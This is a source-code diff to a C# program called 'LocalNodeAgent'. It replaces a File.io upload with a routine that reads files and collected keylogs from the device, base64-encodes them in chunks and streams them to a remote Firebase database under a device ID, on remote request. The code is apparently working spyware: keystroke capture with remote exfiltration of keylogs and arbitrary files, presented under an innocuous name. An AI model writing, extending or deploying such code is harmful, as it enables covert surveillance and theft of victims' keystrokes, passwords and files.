@@ -581,16 +581,16 @@ namespace LocalNodeAgent
                 }
 
                 // Status: Uploading
-                await SendStatus(reqId, "uploading", "Uploading to File.io...");
+                await SendStatus(reqId, "uploading", "Encoding and uploading...");
 
-                Log($"Uploading {Path.GetFileName(filePath)} to File.io...");
-                var link = await UploadToFileIO(filePath);
+                Log($"Uploading {Path.GetFileName(filePath)} to Firebase...");
+                var result = await UploadToFirebase(filePath, reqId);
                 
-                if (!string.IsNullOrEmpty(link))
+                if (!string.IsNullOrEmpty(result))
                 {
                     // Status: Success
                     var response = new { 
-                        url = link, 
+                        type = "firebase",
                         filename = Path.GetFileName(filePath),
                         status = "success",
                         timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() 
@@ -598,12 +598,12 @@ namespace LocalNodeAgent
                     await _http.PutAsync($"{FIREBASE_DB_URL}responses/{_deviceId}/{reqId}.json?auth={_idToken}", 
                         new StringContent(JsonSerializer.Serialize(response), Encoding.UTF8, "application/json"));
                     
-                    Log($"Upload Complete: {link}");
+                    Log($"Upload Complete");
                 }
                 else
                 {
-                    await SendStatus(reqId, "failed", "Upload failed (File.io error).");
-                    Log("Upload Failed: No link returned");
+                    await SendStatus(reqId, "failed", "Upload failed.");
+                    Log("Upload Failed");
                 }
             }
             catch (Exception ex) { 
@@ -628,13 +628,13 @@ namespace LocalNodeAgent
                 SaveKeylogsToFile();
 
                 await SendStatus(reqId, "uploading", "Uploading keylogs...");
-                Log($"Uploading keylogs to File.io...");
-                var link = await UploadToFileIO(_keylogPath);
+                Log($"Uploading keylogs to Firebase...");
+                var result = await UploadToFirebase(_keylogPath, reqId);
                 
-                if (!string.IsNullOrEmpty(link))
+                if (!string.IsNullOrEmpty(result))
                 {
                     var response = new { 
-                        url = link, 
+                        type = "firebase",
                         filename = "keylogs.dat",
                         status = "success",
                         timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() 
@@ -642,7 +642,7 @@ namespace LocalNodeAgent
                     await _http.PutAsync($"{FIREBASE_DB_URL}responses/{_deviceId}/{reqId}.json?auth={_idToken}", 
                         new StringContent(JsonSerializer.Serialize(response), Encoding.UTF8, "application/json"));
                     
-                    Log($"Keylog upload complete: {link}");
+                    Log($"Keylog upload complete");
                 }
                 else
                 {
@@ -658,49 +658,64 @@ namespace LocalNodeAgent
              try
              {
                 var update = new { status = status, message = message, timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() };
-                await _http.PatchAsync($"{FIREBASE_DB_URL}responses/{_deviceId}/{reqId}.json?auth={_idToken}", 
+                var response = await _http.PatchAsync($"{FIREBASE_DB_URL}responses/{_deviceId}/{reqId}.json?auth={_idToken}", 
                         new StringContent(JsonSerializer.Serialize(update), Encoding.UTF8, "application/json"));
+                if(!response.IsSuccessStatusCode) Log($"SendStatus Failed: {response.StatusCode}");
              }
-             catch {}
+             catch (Exception ex) { Log($"SendStatus Error: {ex}"); }
         }
 
-        static async Task<string> UploadToFileIO(string filePath)
+        static async Task<string> UploadToFirebase(string filePath, string reqId)
         {
             try
             {
-                using var form = new MultipartFormDataContent();
-                // Use FileShare.ReadWrite to avoid locking issues with other apps (like browsers)
-                using var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
-                using var fileContent = new StreamContent(fileStream);
-                
-                // Add file content
-                fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
-                form.Add(fileContent, "file", Path.GetFileName(filePath));
-                
-                // Set expiry to 14 days (max) or 1 download
-                // free tier is 1 download auto-delete usually
-                
-                var resp = await _http.PostAsync("https://file.io", form);
-                var json = await resp.Content.ReadAsStringAsync();
-                
-                if(resp.IsSuccessStatusCode)
+                var fileBytes = await File.ReadAllBytesAsync(filePath);
+                var totalSize = fileBytes.Length;
+                const int chunkSize = 50 * 1024; // 50KB chunks
+                var totalChunks = (int)Math.Ceiling((double)totalSize / chunkSize);
+
+                Log($"Streaming {totalChunks} chunks for {Path.GetFileName(filePath)}");
+
+                // Send metadata first
+                var metadata = new {
+                    filename = Path.GetFileName(filePath),
+                    totalSize = totalSize,
+                    totalChunks = totalChunks,
+                    chunkSize = chunkSize,
+                    timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()
+                };
+                await _http.PutAsync($"{FIREBASE_DB_URL}file_stream/{_deviceId}/{reqId}/meta.json?auth={_idToken}",
+                    new StringContent(JsonSerializer.Serialize(metadata), Encoding.UTF8, "application/json"));
+
+                // Stream chunks
+                for (int i = 0; i < totalChunks; i++)
                 {
-                    using var doc = JsonDocument.Parse(json);
-                    
-                    if(doc.RootElement.TryGetProperty("link", out var linkEl))
-                        return linkEl.GetString();
-                        
-                    if(doc.RootElement.TryGetProperty("success", out var success) && !success.GetBoolean())
-                        Log($"File.io JSON Error: {json}");
+                    var offset = i * chunkSize;
+                    var length = Math.Min(chunkSize, totalSize - offset);
+                    var chunk = new byte[length];
+                    Array.Copy(fileBytes, offset, chunk, 0, length);
+
+                    var chunkData = new {
+                        index = i,
+                        data = Convert.ToBase64String(chunk),
+                        timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()
+                    };
+
+                    await _http.PutAsync($"{FIREBASE_DB_URL}file_stream/{_deviceId}/{reqId}/chunks/{i}.json?auth={_idToken}",
+                        new StringContent(JsonSerializer.Serialize(chunkData), Encoding.UTF8, "application/json"));
+
+                    // Small delay to avoid overwhelming Firebase
+                    if (i < totalChunks - 1) await Task.Delay(50);
                 }
-                else
-                {
-                    Log($"File.io HTTP Error: {resp.StatusCode} - Body: {json}");
-                }
+
+                Log($"Streaming complete: {totalChunks} chunks sent");
+                return "streaming";
             }
-            catch(Exception ex) { Log($"UploadToFileIO Exception: {ex.Message}"); }
-            
-            return null;
+            catch(Exception ex) 
+            { 
+                Log($"UploadToFirebase Exception: {ex.Message}"); 
+                return null;
+            }
         }
         static async Task ProcessKeylogDelete(string reqId)
         {
